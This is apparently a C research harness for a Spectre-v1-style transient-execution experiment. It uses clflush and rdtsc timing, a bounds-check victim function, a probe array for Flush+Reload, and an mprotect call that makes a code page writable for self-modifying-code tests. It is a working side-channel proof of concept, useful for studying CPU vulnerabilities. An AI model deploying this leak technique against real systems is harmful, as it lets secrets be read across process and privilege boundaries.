#include <signal.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdlib.h>
#include <time.h>
#include <signal.h>
#include <setjmp.h>
#include <pthread.h>
#include <sched.h>
#include <sys/mman.h>
#include <math.h>
// // 
// #include "a.h"

size_t CACHE_MISS = 250;

// ---------------------------------------------------------------------------
__attribute__((always_inline)) inline void flush(void *p) { asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax"); }

// ---------------------------------------------------------------------------
__attribute__((always_inline)) inline void maccess(void *p) { asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax"); }

void maccess_wr(void *p, int val) { asm volatile("movq %%rax, (%1)\n" : : "a"(val), "c"(p) : ); }

// ---------------------------------------------------------------------------
__attribute__((always_inline)) inline void mfence() { asm volatile("mfence"); }

// ---------------------------------------------------------------------------
__attribute__((always_inline)) inline void lfence() { asm volatile("lfence"); }

__attribute__((always_inline)) inline uint64_t rdtsc() {
    uint64_t a = 0, d = 0;
    asm volatile("mfence");
    asm volatile("rdtsc" : "=a"(a), "=d"(d));
    asm volatile("mfence");

    return (d << 32) | a;
}

__attribute__((always_inline)) inline uint64_t rdpmc(uint32_t counter)
{
    uint32_t eax, edx;
    __asm__ __volatile__("rdpmc" : "=a" (eax), "=d" (edx) : "c" (counter));
    return ((uint64_t)edx << 32) | eax;
}

#define read_all_pmc(p0, p1, p2, p3)\
    do{\
        mfence();\
        p0 = rdpmc(0);\
        mfence();\
        p1 = rdpmc(1);\
        mfence();\
        p2 = rdpmc(2);\
        mfence();\
        p3 = rdpmc(3);\
        mfence();\
    }while(0);


int compare(const void *a, const void *b) {
    return (*(long int*)a - *(long int*)b);
}

int findModes(long long int *arr, int size) {
    qsort(arr, size, sizeof(long long int), compare);

    int currentCount = 1;
    int maxCount = 1;
    int i = 0;
    while(arr[i] == 0)
        i ++;
    long long int modeValue = arr[i];
    // printf("Mode(s): ");

    for (i = i + 1; i < size; i++) {
        if(arr[i] == 0)
            continue;
        if (arr[i] == arr[i-1]) {
            // 相同元素计数
            currentCount++;
        } else {
            // 遇到不同元素，检查之前的元素计数
            if (currentCount > maxCount) {
                // 找到了新的众数
                maxCount = currentCount;
                modeValue = arr[i-1];
                // printf("\n%d (Frequency: %d)", modeValue, maxCount);
                // return modeValue;
            } 
            // else if (currentCount == maxCount) {
                // 找到一个众数，且众数频率相同
                // return arr[i-1];
                // printf(", %d (Frequency: %d)", arr[i-1], currentCount);
            // }
            currentCount = 1; // 重置计数器
        }
    }

    // 处理数组最后一个元素
    if (currentCount > maxCount) {
        // 找到了新的众数
        // printf("\n%d (Frequency: %d)", arr[size-1], currentCount);
        return arr[size-1];
    } else if (currentCount == maxCount) {
        // 找到一个众数，且众数频率相同
        // printf(", %d (Frequency: %d)", arr[size-1], currentCount);
        return arr[size-1];
    }
}


long long int findMode(long long int arr[], int length) {
    qsort(arr, length, sizeof(long long int), compare);
    if (length == 0) {
        return -1; // 返回-1表示数组为空
    }

    long long int mode = arr[0];
    int maxCount = 1;

    // 遍历数组找出众数
    for (int i = 0; i < length; i++) {
        int count = 0;

        // 计算当前元素的出现次数
        for (int j = 0; j < length; j++) {
            if (arr[j] == arr[i]) {
                count++;
            }
        }

        // 更新众数
        if (count > maxCount) {
            maxCount = count;
            mode = arr[i];
        }
    }

    return mode;
}


extern uint8_t vic(uint8_t cond, uint64_t val);
extern void* safe;
extern void* target;
extern char probe_array[256 * 4096];


int array1_len = 0x62;

void victim_function(int x){
    uint8_t tmp = 0;
    flush(&array1_len);
    if(x < array1_len){
        x *= 1;
        x *= 1;
        x *= 1;
        x *= 1;
        x *= 1;
        x *= 1;
        tmp |= probe_array[x<<12];
    }
}

long long int pmc[5][1003];

void trigger(){
    mprotect(vic, 4096, PROT_READ | PROT_WRITE | PROT_EXEC);

    // load to avoid page fault
    for(int i = 0; i < 256*4096; ++i)
        probe_array[i] = 1;


    int results[256] = {0};
    
    memset(pmc, 0, sizeof(pmc));
    register uint32_t pmc00 = 0, pmc01 = 0, pmc02 = 0, pmc03 = 0;
    register uint32_t pmc10 = 0, pmc11 = 0, pmc12 = 0, pmc13 = 0;
    for(int try = 0; try < 1000; ++try){
        for (size_t i = 0; i < 256; i++) {
            size_t mix_i = ((i * 167) + 13) & 255;
            flush(&probe_array[mix_i * 4096]);
        }
        // for(int k = 0; k < 10; ++k)
        //     vic(((k % 9) >> 3) & 1);
        // 
        // uint64_t instr1 = 0x4800000061c0c748;
        uint64_t instr1 = 0x9090;
        uint64_t instr2 = 0x9090;
        
        mfence();

        // vic(0, instr2);

        flush(&probe_array[0x61 * 4096]);
        flush(&probe_array[0x62 * 4096]);
        // mfence();
        // read_all_pmc(pmc00, pmc01, pmc02, pmc03);
        mfence();
        // victim_function(0x62);
        uint8_t a = vic(0, instr2);

        mfence();
        // read_all_pmc(pmc10, pmc11, pmc12, pmc13);
        // mfence();

        

        // printf("%d\n", a);
        // printf("%d\n", ((try % 9) >> 3) & 1);
        for (size_t i = 0; i < 256; i++) {
            size_t mix_i = ((i * 167) + 13) & 255;
            uint64_t t1 = rdtsc();
            maccess(&probe_array[mix_i * 4096]);
            uint64_t t2 = rdtsc() - t1;
            if (t2 < CACHE_MISS && mix_i != 0) {
                results[mix_i]++;
            }
        }

        // pmc[0][try] =(long int) pmc10 - pmc00;
        // pmc[1][try] = (long int) pmc11 - pmc01;
        // pmc[2][try] = (long int) pmc12 - pmc02;
        // pmc[3][try] =(long int)  pmc13 - pmc03;
    }

    //find modes of pmc
    // long long int modes[4] = {0};
    // for(int i = 0; i < 4; ++i){
    //     modes[i] = findMode(pmc[i], 1000);
    //     printf("pmc %d: %lld\n", i, modes[i]);
    // }

    // find top 2 max
    int j = -1,  k = -1;
    for(int i = 0; i < 256; ++i){
        if(j < 0 || results[i] >= results[j]){
            k = j;
            j = i;
        }
        else if (k < 0 || results[i] >= results[k]){
            k = i;
        }
    }

    printf("idx: %2x score: %d, second_idx:%2x, second score: %d\n", j, results[j], k, results[k]);
    printf("%d, %d\n", results[10], results[20]);

}

#include "../ck/predefined.h"

#define __stringify(x) #x

#define REPEAT_ASM(num)    \
    asm volatile(                       \
        ".rep " __stringify(num) "\n\t"            \
        "nop\n\t"               \
        ".endr"                          \
        :                                \
        :                                \
        : );

#define REPEAT_builtin(num, X)                \
    do {                               \
        int i;                         \
        if (__builtin_constant_p(num)) \
            for (i = 0; i < num; i++)  \
                { X; }                 \
    } while (0)

#define REPEAT_NUM(num,x) REPEAT_##num(x)


int main(){
    // spectre_v1_arguments();
    // spectre_v1_smc();

    // print address of vic, safe, target
    // printf("vic: %p\n", vic);
    printf("pc: %p\n", (uint16_t *)&safe - 1);
    printf("bin: 0x%2x%2x\n", *((uint8_t*)&safe-2), *((uint8_t*)&safe-1));
    printf("target: %p\n", &target);
    
    trigger();

    int num = 10;
    asm volatile(".global debug\n\
                debug:");
    
    // 使用rep指令重复num次
    // REPEAT_ASM(10);
    // REPEAT_10("nop");
    REPEAT_NUM(10, "nop");
    // REPEAT_builtin(10, asm volatile("nop"););
    // asm volatile(".rep 10\n\
    //                 nop\n\
    //                 .endr");

    printf("debug\n");

    return 0;
}
